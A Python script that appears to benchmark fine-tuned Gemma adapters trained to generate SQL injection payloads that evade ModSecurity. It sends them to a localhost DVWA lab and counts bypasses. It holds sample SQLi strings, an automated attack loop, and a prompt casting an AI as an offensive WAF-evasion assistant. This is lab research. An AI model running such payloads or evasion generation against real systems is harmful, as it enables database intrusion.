#!/usr/bin/env python3
"""
Quick test of old Phase 1/2 adapters against STRICT localhost WAF
"""
import httpx
import re
import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
from peft import PeftModel

# Localhost DVWA with STRICT ModSecurity (@detectSQLi/@detectXSS)
DVWA_BASE = "http://localhost:8000/modsec_dvwa"
LOGIN_URL = f"{DVWA_BASE}/login.php"
SQLI_URL = f"{DVWA_BASE}/vulnerabilities/sqli/"
USERNAME = "admin"
PASSWORD = "password"

def login():
    """Login to DVWA"""
    client = httpx.Client(timeout=10.0, follow_redirects=True)
    try:
        r = client.get(LOGIN_URL)
        m = re.search(r"user_token'\s*value='([a-f0-9]{32})'", r.text, re.I)
        token = m.group(1) if m else None
        
        if not token:
            r = client.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD, "Login": "Login"})
        else:
            r = client.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD, "user_token": token, "Login": "Login"})
        
        if "login.php" not in str(r.url).lower():
            print("✅ Logged in")
            return client
        else:
            print("❌ Login failed")
            return None
    except Exception as e:
        print(f"❌ Error: {e}")
        return None

def test_payload(client, payload):
    """Test SQLI payload"""
    try:
        r = client.get(SQLI_URL, params={"id": payload, "Submit": "Submit"})
        
        if r.status_code == 403 or "403 Forbidden" in r.text or "Not Acceptable" in r.text:
            return "BLOCKED"
        
        if "Surname:" in r.text or "First name:" in r.text:
            return "PASSED"
        
        return "BLOCKED"
    except Exception as e:
        return f"ERROR: {e}"

def load_model(base_model, adapter_path):
    """Load model + adapter"""
    print(f"Loading {base_model} + {adapter_path}")
    
    bnb_config = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_compute_dtype=torch.float16
    )
    
    model = AutoModelForCausalLM.from_pretrained(
        base_model,
        quantization_config=bnb_config,
        device_map="auto",
        token=None
    )
    
    model = PeftModel.from_pretrained(model, adapter_path)
    tokenizer = AutoTokenizer.from_pretrained(base_model)
    
    print("✅ Model loaded")
    return model, tokenizer

def generate_payload_phase1(model, tokenizer):
    """Generate with Phase 1 ACTUAL training prompt format"""
    # Phase 1 training format: "Generic prompt for {ATTACK_TYPE} using {TECHNIQUE}"
    techniques = [
        "Double URL Encode",
        "Comment Obfuscation", 
        "Boolean-based",
        "UNION SELECT",
        "Hex Encoding",
        "Unicode Encoding"
    ]
    
    technique = techniques[torch.randint(0, len(techniques), (1,)).item()]
    prompt = f"Generic prompt for SQLI using {technique}"
    
    messages = [{"role": "user", "content": prompt}]
    text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
    
    inputs = tokenizer(text, return_tensors="pt", truncation=True, max_length=1024).to(model.device)
    
    with torch.no_grad():
        outputs = model.generate(
            **inputs,
            max_new_tokens=150,
            temperature=0.7,
            do_sample=True,
            pad_token_id=tokenizer.eos_token_id
        )
    
    result = tokenizer.decode(outputs[0][inputs.input_ids.shape[1]:], skip_special_tokens=True).strip()
    payload = result.split('\n')[0]
    
    return payload

def generate_payload_phase2(model, tokenizer):
    """Generate with Phase 2 ACTUAL reasoning prompt format"""
    techniques = [
        "Double URL Encode",
        "Comment Obfuscation",
        "SQLI Keyword (heuristic)",
        "Boolean-based blind",
        "UNION SELECT obfuscation",
        "Hex encoding"
    ]
    
    # Random previous attempts (simulating blocked history)
    blocked_payloads = [
        "' OR 1=1 --",
        "admin' #",
        "1 UNION SELECT 1,2,3",
        "' AND SLEEP(5)--"
    ]
    
    technique = techniques[torch.randint(0, len(techniques), (1,)).item()]
    history_str = "\n".join([f"{i+1}) {p}" for i, p in enumerate(blocked_payloads[:2])])
    
    # EXACT Phase 2 training format
    prompt = f"""You are an offensive security assistant specialized in generating WAF-evasion payloads.

Context:
- Target WAF: ModSecurity + OWASP CRS 3.3 (PL1).
- Attack type: SQL injection.
- Injection point: query parameter.

Previously tried payloads against this target (all blocked by the WAF):
{history_str}

Your task:
Generate a NEW SQL injection payload that has a higher chance of bypassing this WAF while still reaching and triggering the underlying vulnerability.
Use the following core technique as the main idea for the payload:
- Technique: {technique}

You may combine this technique with additional obfuscation tricks if it helps evade the filter, but keep the payload compact and realistic.

IMPORTANT:
- Output ONLY the final payload string.
- Do NOT add explanations or comments.
- Do NOT wrap it in code fences."""
    
    messages = [{"role": "user", "content": prompt}]
    text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
    
    inputs = tokenizer(text, return_tensors="pt", truncation=True, max_length=1024).to(model.device)
    
    with torch.no_grad():
        outputs = model.generate(
            **inputs,
            max_new_tokens=150,
            temperature=0.7,
            do_sample=True,
            pad_token_id=tokenizer.eos_token_id
        )
    
    result = tokenizer.decode(outputs[0][inputs.input_ids.shape[1]:], skip_special_tokens=True).strip()
    payload = result.split('\n')[0]
    
    return payload

def test_adapter(base_model, adapter_path, phase):
    """Test adapter against strict WAF"""
    print("\n" + "="*80)
    print(f"Testing: {adapter_path}")
    print("="*80)
    
    client = login()
    if not client:
        return
    
    model, tokenizer = load_model(base_model, adapter_path)
    
    results = {"PASSED": 0, "BLOCKED": 0, "ERROR": 0}
    
    print(f"\nGenerating and testing 10 payloads...")
    
    for i in range(10):
        if phase == 1:
            payload = generate_payload_phase1(model, tokenizer)
        else:
            payload = generate_payload_phase2(model, tokenizer)
        
        result = test_payload(client, payload)
        results[result] += 1
        
        status_emoji = "✅" if result == "PASSED" else "❌"
        print(f"{i+1}. {status_emoji} {payload[:60]}... -> {result}")
    
    total = sum(results.values())
    print(f"\n📊 Results:")
    print(f"   PASSED: {results['PASSED']}/{total} ({results['PASSED']/total*100:.1f}%)")
    print(f"   BLOCKED: {results['BLOCKED']}/{total}")
    print(f"   ERROR: {results['ERROR']}/{total}")
    
    client.close()
    return results

def main():
    # Test Phase 1 SFT (Gemma 2 2B) - v40 subsample 5k
    test_adapter(
        base_model="google/gemma-2-2b-it",
        adapter_path="experiments/gemma2_2b_v40_subsample_5k",
        phase=1
    )
    
    # Test Phase 2 Reasoning (Gemma 2 2B)
    test_adapter(
        base_model="google/gemma-2-2b-it",
        adapter_path="experiments/phase2_gemma2_2b_reasoning",
        phase=2
    )

if __name__ == "__main__":
    main()
